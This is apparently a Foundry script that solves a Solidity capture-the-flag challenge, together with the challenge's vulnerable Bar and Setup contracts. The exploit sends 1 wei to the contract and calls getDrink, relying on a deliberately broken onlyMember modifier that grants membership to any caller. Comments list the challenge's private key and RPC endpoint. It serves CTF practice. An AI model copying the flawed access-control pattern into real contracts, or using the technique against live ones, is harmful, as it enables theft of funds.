// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x2968E76c74D21390940f809CD27766F03dEdCDFE);
    address wallet = 0x9690Be883A730d8c55EfCb2332a0c2c9Ae839D0b;
    Bar public bar = setup.bar();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x4be2dec8006deb5d7c31fa26d761587007f44a3fac95746e72c6c7f87f08e1b5);

        console.log(wallet.balance);

        (bool sent,) = address(bar).call{value: 1}("");
        require(sent);
        bar.getDrink();

        setup.solvedByPlayer();

        console.log(setup.isSolved());


        vm.stopBroadcast();
    }
}

// UUID	98e88788-62e8-485b-b1f0-9e0f8e9322fc
// RPC Endpoint	http://103.178.153.113:40003/98e88788-62e8-485b-b1f0-9e0f8e9322fc
// Private Key	0x4be2dec8006deb5d7c31fa26d761587007f44a3fac95746e72c6c7f87f08e1b5
// Setup Contract	0x2968E76c74D21390940f809CD27766F03dEdCDFE
// Wallet	0x9690Be883A730d8c55EfCb2332a0c2c9Ae839D0b

contract Setup{
    Bar public immutable bar;
    bool public playerSolved;

    constructor() payable{
        bar = new Bar();
    }

    function solvedByPlayer() public {
        playerSolved = bar.beerGlass(msg.sender) >= 1 ? true : false;
    }

    function isSolved() public view returns(bool){
        return playerSolved;
    }

}

contract Bar{

    address public owner;
    mapping(address => bool) public barMember;
    mapping(address => uint) public beerGlass;
    mapping(address => uint256) public balance;

    constructor() payable{
        owner = msg.sender;
    }

    function register() public payable isHuman{
        // You can register here, but still need the Onwer to add you in.
        require(msg.value >= 1e18, "Need 1 ether deposit.");
        balance[msg.sender] += msg.value;
    }

    function addMember(address _addMember) public isHuman onlyOwner(_addMember){
        require(balance[_addMember] > 0, "You need to deposit some money to become a member.");
        barMember[_addMember] = true;
    }

    function getDrink() public isHuman onlyMember{
        require(balance[msg.sender] > 0, "You need to deposit some money.");
        beerGlass[msg.sender]++;
    }

    modifier isHuman(){
        require(msg.sender == tx.origin, "Only Human Allowed in this Bar!");
        _;
    }

    modifier onlyOwner(address _addMember) {
        require(owner == msg.sender, "Only Owner can add Member!");
        _;
    }

    modifier onlyMember() {
        barMember[msg.sender] = true;
        _;
    }

    receive() external payable{
        balance[msg.sender] += msg.value;
    }
    
} 